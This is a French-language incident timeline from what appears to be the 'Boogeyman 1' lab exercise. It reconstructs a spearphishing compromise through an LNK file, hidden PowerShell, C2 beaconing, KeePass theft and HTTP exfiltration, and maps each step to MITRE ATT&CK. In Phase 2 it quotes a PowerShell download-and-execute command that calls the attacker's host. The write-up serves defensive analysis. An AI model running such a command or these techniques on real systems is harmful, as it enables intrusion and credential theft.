# ⏱️ Chronologie de l'Incident : Opération Boogeyman 1

Ce document détaille la chronologie technique (Timeline) de la compromission du poste de Julianne (Département Financier, Quick Logistics LLC) par le groupe de menace **Boogeyman**. Les événements ont été reconstitués grâce à la corrélation des en-têtes d'e-mails, des journaux d'événements PowerShell (`powershell.json`) et de la capture de trafic réseau (`capture.pcapng`).

---

##  Chronologie des Événements

###  Phase 1 : Livraison et Accès Initial (Phishing)
- **Vecteur :** E-mail de Spearphishing
- **Technique MITRE ATT&CK :** T1566.001 (Phishing: Spearphishing Attachment)
- **Détails de l'événement :**
  - L'attaquant envoie un e-mail ciblé à Julianne en usurpant l'identité d'Arthur Griffin de *B Packaging Inc*.
  - **Domaine Typosquatté :** `bpakcaging.xyz` (remarquez l'inversion du 'k' et du 'c').
  - **Relais utilisé :** L'e-mail a été routé via un service de messagerie tiers (Elastic Email) pour tenter de contourner les filtres de réputation IP.
  - **Charge utile :** L'e-mail contient un fichier attaché nommé `Invoice.zip`.
  - **Ingénierie Sociale :** Pour contourner l'analyse des passerelles de messagerie, l'archive est chiffrée. L'attaquant fournit le mot de passe (`Invoice2023!`) directement dans le corps du message.

###  Phase 2 : Exécution de la Charge Utile
- **Technique MITRE ATT&CK :** T1204.002 (User Execution: Malicious File), T1059.001 (PowerShell)
- **Détails de l'événement :**
  - L'utilisatrice extrait l'archive et exécute le fichier contenu : `Invoice Jan 2023.lnk`.
  - L'analyse de ce raccourci Windows (via `lnkparse`) révèle qu'il ne pointe pas vers un document légitime, mais invoque furtivement `powershell.exe`.
  - Le raccourci exécute une commande PowerShell avec les drapeaux `-nop -windowstyle hidden -enc` pour s'exécuter en arrière-plan sans alerter l'utilisatrice.
  - La commande encodée en Base64 se traduit par : `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')`.

###  Phase 3 : Établissement du Command and Control (C2)
- **Technique MITRE ATT&CK :** T1105 (Ingress Tool Transfer)
- **Détails de l'événement :**
  - Le script PowerShell télécharge et exécute en mémoire la suite du code malveillant depuis l'infrastructure de l'attaquant (`files.bpakcaging.xyz`).
  - Le malware initie une boucle de communication (Beaconing) vers le domaine C2 `line.bpakcaging.xyz` et `cdn.bpakcaging.xyz`.
  - L'attaquant utilise un Payload Server (`167.71.211.113`) pour déposer des outils supplémentaires sur la machine compromise, dont un exécutable nommé `sb.exe` (récupéré via une requête `GET /sb.exe` en HTTP clair) et un outil d'énumération système `Seatbelt.exe`.

###  Phase 4 : Découverte et Collecte de Données
- **Technique MITRE ATT&CK :** T1555.005 (Credentials from Password Stores: Password Managers), T1005 (Data from Local System)
- **Détails de l'événement :**
  - L'attaquant télécharge un binaire légitime d'interaction avec des bases de données SQLite, renommé `sq3.exe`.
  - **Cible 1 (Sticky Notes) :** L'attaquant utilise `sq3.exe` pour interroger le fichier `plum.sqlite` situé dans le répertoire de l'application Microsoft Sticky Notes, à la recherche de mots de passe ou d'informations sensibles notées en clair.
  - **Cible 2 (KeePass) :** L'attaquant localise et cible le gestionnaire de mots de passe de l'utilisatrice. Le fichier `protected_data.kdbx` est identifié comme cible prioritaire pour l'exfiltration.

###  Phase 5 : Exfiltration
- **Technique MITRE ATT&CK :** T1048.003 (Exfiltration Over Alternative Protocol - Unencrypted HTTP)
- **Détails de l'événement :**
  - Les données du fichier `.kdbx` (ainsi que les retours des commandes d'énumération) sont obfusquées (formatées en décimal/URL-encoded) pour contourner les solutions DLP (Data Loss Prevention).
  - Les données sont exfiltrées via des requêtes HTTP `POST` volumineuses envoyées au serveur C2 `cdn.bpakcaging.xyz` sur le port `8080`.
  - La capture PCAP confirme la sortie réussie des données (paquets TCP de plus de 5000 octets contenant les charges utiles encodées).

---

##  Résumé de l'Impact
L'attaque a abouti à une **fuite de données confirmée**. Le coffre-fort de mots de passe KeePass (`protected_data.kdbx`) de l'employée a été exfiltré. Tous les identifiants professionnels, personnels, ou bancaires (numéros de cartes de crédit) contenus dans cette base doivent être considérés comme compromis par le groupe Boogeyman.